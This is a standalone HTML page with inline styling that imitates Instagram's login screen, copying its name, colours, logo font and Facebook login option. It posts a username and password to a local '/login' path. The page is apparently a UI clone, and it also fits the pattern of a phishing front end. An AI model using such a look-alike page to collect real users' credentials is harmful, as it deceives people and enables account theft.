<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            text-align: center;
            border-radius: 8px;
        }

        .login-container h1 {
            font-family: 'Billabong', sans-serif;
            font-size: 48px;
            color: #262626;
        }

        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background-color: #fafafa;
        }

        .submit-btn {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
        }

        .submit-btn:hover {
            background-color: #0073c3;
        }

        .or-divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 20px 0;
        }

        .or-divider::before,
        .or-divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }

        .or-divider:not(:empty)::before {
            margin-right: .25em;
        }

        .or-divider:not(:empty)::after {
            margin-left: .25em;
        }

        .or-divider span {
            color: #8e8e8e;
            font-size: 13px;
        }

        .facebook-login {
            color: #385185;
            margin-top: 10px;
            font-size: 14px;
        }

        .facebook-login i {
            margin-right: 5px;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h1>Instagram</h1>
    <form action="/login" method="POST">
        <input type="text" name="username" placeholder="Instagram ID" class="input-field" required>
        <input type="password" name="password" placeholder="Password" class="input-field" required>
        <button type="submit" class="submit-btn">Log In</button>
    </form>

    <div class="or-divider"><span>OR</span></div>

    <div class="facebook-login">
        <i class="fab fa-facebook-square"></i> Log in with Facebook
    </div>
</div>

</body>
</html>
